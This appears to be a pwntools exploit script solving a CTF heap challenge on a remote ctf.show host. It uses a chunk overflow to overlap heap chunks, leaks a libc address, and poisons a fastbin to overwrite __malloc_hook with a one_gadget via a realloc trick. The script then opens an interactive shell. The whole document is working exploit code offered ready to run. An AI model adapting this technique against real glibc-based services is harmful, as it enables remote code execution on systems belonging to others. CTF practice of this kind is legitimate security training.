from pwn import *


context(os="linux", arch="amd64")

HOST = args.HOST or "pwn.challenge.ctf.show"
PORT = int(args.PORT or 28175)

elf = ELF("./pwn", checksec=False)
libc = ELF("../libcs/ubuntu16/64bit/libc-2.23.so", checksec=False)


def start():
    if args.LOCAL:
        return process(elf.path)
    return remote(HOST, PORT)


def add(io, size):
    io.sendlineafter(b"Command: ", b"1")
    io.sendlineafter(b"Size: ", str(size).encode())


def edit(io, idx, data):
    io.sendlineafter(b"Command: ", b"2")
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.sendlineafter(b"Size: ", str(len(data)).encode())
    io.sendafter(b"Content: ", data)


def delete(io, idx):
    io.sendlineafter(b"Command: ", b"3")
    io.sendlineafter(b"Index: ", str(idx).encode())


def show(io, idx):
    io.sendlineafter(b"Command: ", b"4")
    io.sendlineafter(b"Index: ", str(idx).encode())


def exploit(io):
    # chunk0 overflows into chunk1->size, forging a 0xa0 free chunk that covers chunk2
    add(io, 0x40)  # 0
    add(io, 0x40)  # 1
    add(io, 0x40)  # 2
    add(io, 0x60)  # 3

    edit(io, 0, b"A" * 0x40 + p64(0) + p64(0xA1))
    delete(io, 1)
    add(io, 0x40)

    show(io, 2)
    leak = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
    malloc_hook = leak - 0x10 - 88
    libc.address = malloc_hook - libc.sym["__malloc_hook"]
    realloc = libc.sym["realloc"]
    fake_chunk = libc.sym["__malloc_hook"] - 0x23
    one_gadget = libc.address + 0x4526A

    log.success(f"leak         = {hex(leak)}")
    log.success(f"libc_base    = {hex(libc.address)}")
    log.success(f"malloc_hook  = {hex(libc.sym['__malloc_hook'])}")
    log.success(f"fake_chunk   = {hex(fake_chunk)}")
    log.success(f"one_gadget   = {hex(one_gadget)}")

    # chunk2 still points into a free chunk and can corrupt freed chunk3's fastbin fd.
    delete(io, 3)
    edit(io, 2, b"B" * 0x40 + p64(0) + p64(0x71) + p64(fake_chunk))
    add(io, 0x60)
    add(io, 0x60)

    # Returned pointer is malloc_hook-0x13, so 0x0b padding places the gadget on malloc_hook.
    edit(io, 4, b"C" * (0x13 - 8) + p64(one_gadget) + p64(realloc + 8))
    add(io, 0x10)


if __name__ == "__main__":
    io = start()
    exploit(io)
    io.interactive()
